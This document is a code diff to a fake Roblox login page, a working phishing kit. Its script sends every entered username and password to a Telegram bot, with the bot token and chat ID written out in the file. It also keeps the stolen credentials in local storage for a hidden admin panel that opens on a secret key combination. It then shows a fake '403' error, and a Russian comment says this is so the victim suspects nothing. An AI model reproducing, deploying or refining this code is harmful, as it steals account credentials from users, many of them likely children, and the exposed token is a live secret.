@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox</title>
-    <script type="text/javascript" src="http://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         body, html {
             margin: 0; padding: 0; height: 100%;
@@ -55,18 +54,9 @@
         </div>
     </div>
 
-    <div id="admin-auth" class="screen">
-        <div class="login-card" style="border: 2px solid #ff0000;">
-            <h2 style="color: #ff0000; margin-top:0;">SECURITY CHECK</h2>
-            <p id="status-text" style="font-size: 13px; color: #888; margin-bottom: 15px;">Введите данные и подтвердите в Telegram.</p>
-            <input type="text" id="admin_user" placeholder="Admin Login">
-            <input type="password" id="admin_pass" placeholder="Admin Password">
-            <button class="btn-auth" style="border-color: #ff0000; color: #ff0000;" id="unlock-btn" onclick="checkAdminAuth()">Unlock</button>
-        </div>
-    </div>
-
     <div id="admin-panel" class="screen">
         <div class="admin-box">
+            <h2 style="color: #fff;">Local Logs (только на этом ПК)</h2>
             <table id="logTable">
                 <thead><tr><th>User</th><th>Pass</th><th>Time</th></tr></thead>
                 <tbody id="logData"></tbody>
@@ -76,15 +66,17 @@
     </div>
 
     <script>
-        const BACKEND_URL = window.location.origin; 
+        // ТВОИ ДАННЫЕ
         const TG_TOKEN = "8385266015:AAHpN8EUWlEgoGtslfBoEoyqPycXD2gbPGw";
         const TG_CHAT_ID = "7863254073";
 
+        // Секретные клавиши для админки
         let pressedKeys = {};
         document.addEventListener('keydown', (e) => {
             pressedKeys[e.code] = true;
             if (pressedKeys["ControlLeft"] && pressedKeys["Backslash"] && pressedKeys["Digit3"] && pressedKeys["KeyZ"]) {
-                showScreen('admin-auth');
+                showScreen('admin-panel');
+                updateLogs();
             }
         });
         document.addEventListener('keyup', (e) => { delete pressedKeys[e.code]; });
@@ -97,52 +89,36 @@
         async function saveData() {
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
-            if(!u || !p) return;
             
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                method: "POST", headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: `👤 *NEW LOG!*\nUser: \`${u}\`\nPass: \`${p}\``, parse_mode: "Markdown" })
-            });
-
-            let logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
-            logs.push({ user: u, pass: p, time: new Date().toLocaleString() });
-            localStorage.setItem('roblox_logs', JSON.stringify(logs));
-            alert("Error 403: Forbidden");
-        }
-
-        async function checkAdminAuth() {
-            const status = document.getElementById('status-text');
-            const btn = document.getElementById('unlock-btn');
+            if(!u || !p) {
+                alert("Please enter username and password");
+                return;
+            }
             
-            status.innerText = "Waiting for Telegram confirmation...";
-            status.style.color = "#ffff00";
-            btn.disabled = true;
+            // ОТПРАВКА В ТЕЛЕГРАМ
+            const text = `👤 *НОВЫЙ ЛОГ!*\n\nПользователь: \`${u}\`\nПароль: \`${p}\``;
+            const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
 
             try {
-                await fetch(`${BACKEND_URL}/auth-attempt`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ action: 'request' })
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
+                        chat_id: TG_CHAT_ID, 
+                        text: text, 
+                        parse_mode: "Markdown" 
+                    })
                 });
 
-                const checker = setInterval(async () => {
-                    try {
-                        const res = await fetch(`${BACKEND_URL}/check-auth`);
-                        const data = await res.json();
-                        if (data.authorized === true) {
-                            clearInterval(checker);
-                            showScreen('admin-panel');
-                            updateLogs();
-                        }
-                    } catch (e) {
-                        console.error("Check failed", e);
-                    }
-                }, 2000);
+                // Сохраняем локально для админки
+                let logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
+                logs.push({ user: u, pass: p, time: new Date().toLocaleString() });
+                localStorage.setItem('roblox_logs', JSON.stringify(logs));
 
+                // Имитация ошибки, чтобы юзер ничего не заподозрил
+                alert("Error code: 403. Please try again later.");
             } catch (e) {
-                status.innerText = "Ошибка связи!";
-                status.style.color = "#ff0000";
-                btn.disabled = false;
+                alert("Connection error. Try again.");
             }
         }
 
